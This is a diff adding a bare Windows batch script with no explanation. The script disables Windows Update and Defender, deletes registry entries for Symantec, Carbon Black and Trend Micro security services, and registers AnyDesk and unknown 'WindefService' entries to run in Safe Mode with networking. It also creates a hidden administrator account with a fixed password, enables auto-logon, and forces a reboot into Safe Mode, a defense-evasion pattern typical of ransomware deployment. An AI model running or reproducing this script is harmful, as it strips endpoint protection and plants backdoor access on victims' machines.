@@ -1,0 +1,39 @@
+gpupdate /force &
+net stop wuauserv &
+sc config wuauserv start= disabled &
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f &
+reg delete HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\SepMasterService /f &
+reg delete HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\TMBMServer /f &
+reg delete HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\TMBMServer /f &
+reg delete HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\CbDefense /f &
+reg delete HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\CbDefenseWSC /f &
+reg delete HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\TmCCSF /f &
+reg delete HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\TmWSCSvc /f &
+reg delete HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TMBMServer /f &
+reg delete HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\TMLWCSService /f &
+reg delete HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\TMLWCSService /f &
+reg delete HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\TMSmartRelayService /f &
+reg delete HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\TMSmartRelayService /f &
+reg delete HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TMSmartRelayService /f &
+reg delete HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\TMiCRCScanService /f &
+reg delete HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\TMiCRCScanService /f &
+reg delete HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TMiCRCScanService /f &
+reg delete HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\TMBMServer /f &
+reg delete HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\TMBMServer /f &
+reg delete HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\TMBMServer /f &
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\AnyDeskMSI /f &
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\AnyDeskMSI /t REG_SZ /d Service /f &
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\WindefService /f &
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\WindefService /t REG_SZ /d Service /f &
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\AnyDesk /f &
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\AnyDesk /t REG_SZ /d Service /f &
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\WindefServiceRestart /f &
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\WindefServiceRestart /t REG_SZ /d Service /f &
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName /t REG_SZ /d admin /f &
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword /t REG_SZ /d Password123! /f &
+reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /t REG_SZ /d 1 /f &
+net user admin Password123! /add &
+net localgroup Administrators admin /add &
+bcdedit /set {default} safeboot network &
+echo 0 &
+shutdown -r -f -t 0
